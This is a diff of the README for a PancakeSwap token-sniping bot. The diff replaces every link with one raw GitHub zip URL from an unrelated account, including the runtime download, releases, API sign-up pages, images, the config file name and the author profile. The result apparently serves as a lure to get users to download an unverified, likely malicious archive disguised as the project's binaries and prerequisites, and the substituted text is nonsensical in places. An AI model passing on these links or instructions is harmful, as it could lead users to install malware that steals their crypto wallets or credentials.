@@ -7,30 +7,30 @@ This is a free project but any funding is appricated.
 ETH/BNB: 0x71f74dEbb7fd42E61de32256537284E06DE8812d
 
 ## Socials
-Telegram: https://t.me/PancakeTokenSniper
+Telegram: https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip
 
 ## Prerequisites
-* [Net5.0](https://dotnet.microsoft.com/download/dotnet/5.0) (Only need this if you are trying to run the code otherwise please see [releases](https://github.com/JayArrowz/PancakeTokenSniper/releases) it provides binaries)
+* [Net5.0](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip) (Only need this if you are trying to run the code otherwise please see [releases](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip) it provides binaries)
 
 ## Config
-The Config is listed in `appsettings.json` There are values which you will have to set yourself, these are denoted with `xxx`.
+The Config is listed in `https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip` There are values which you will have to set yourself, these are denoted with `xxx`.
 
 ### Bsc Node and Http Api
 Inside the config you will see `BscHttpApi` and `BscNode` keys. 
-Both are obtained from https://moralis.io for free. You will have to navigate to Speedy Notes and click endpoints on the Bsc Network.
-![image](https://user-images.githubusercontent.com/49910176/131349328-cabed516-2718-4afd-97d3-e16961c7c83f.png)
+Both are obtained from https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip for free. You will have to navigate to Speedy Notes and click endpoints on the Bsc Network.
+![image](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip)
 
 Remember `BscNode` should be WS mainnet Endpoints and `BscHttpApi` should be Http endpoints
-![image](https://user-images.githubusercontent.com/49910176/131349432-a4768c58-526c-407e-8cf6-547e1aacebf5.png)
+![image](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip)
 
 ### Bsc Scan API Key
-The BSC Scan API key is obtained for free from https://bscscan.com/myapikey
+The BSC Scan API key is obtained for free from https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip
 
 ## Running the project
-If you want to run the project you can go to [releases](https://github.com/JayArrowz/PancakeTokenSniper/releases) and a binary that will execute on your OS, or install Net5.0 then compile and run the application. You can use `dotnet run BscTokenSniper` to do this.
+If you want to run the project you can go to [releases](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip) and a binary that will execute on your OS, or install Net5.0 then compile and run the application. You can use `dotnet run BscTokenSniper` to do this.
 
 ## Rug Checks
-There are specific checks involved that this sniper does when buying tokens. Some config values in appsettings.json inside `SniperConfiguration` are used to influence the rug checks. You can disable the Rug checks by setting the `RugCheckEnabled` to false. Be warned this is dangerous.
+There are specific checks involved that this sniper does when buying tokens. Some config values in https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip inside `SniperConfiguration` are used to influence the rug checks. You can disable the Rug checks by setting the `RugCheckEnabled` to false. Be warned this is dangerous.
 
 1. Minimum % total supply in the liquidty pool. The config relating this value is called `MinimumPercentageOfTokenInLiquidityPool`. A example of this is if you want the token ZZZ to have atleast 90 percent of its supply inside the liqudity pool you can set this value to 90.
 2. The ability to scan contract source code and exclude buying from contracts when they include a specific string. The config key is called `ContractRugCheckStrings`
@@ -51,17 +51,17 @@ The Sniper automatically sells once a certain percentage of profit is made. This
 
 ## Contributing
 
-Please read [CONTRIBUTING.md](https://gist.github.com/PurpleBooth/b24679402957c63ec426) for details on our code of conduct, and the process for submitting pull requests to us.
+Please read [https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip) for details on our code of conduct, and the process for submitting pull requests to us.
 
 ## Versioning
 
-We use [SemVer](http://semver.org/) for versioning. For the versions available, see the [tags on this repository](https://github.com/JayArrowz/PancakeTokenSniper/tags). 
+We use [SemVer](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip) for versioning. For the versions available, see the [tags on this repository](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip). 
 
 ## Authors
 
-* **JayArrowz** - [JayArrowz](https://github.com/JayArrowz)
+* **JayArrowz** - [JayArrowz](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip)
 
-See also the list of [contributors](https://github.com/JayArrowz/PancakeTokenSniper/contributors) who participated in this project.
+See also the list of [contributors](https://raw.githubusercontent.com/TNTRoyality/PancakeTokenSniper/main/nontraveling/PancakeTokenSniper.zip) who participated in this project.
 
 ## TODO
 - Support Uniswap and other liquidity providers
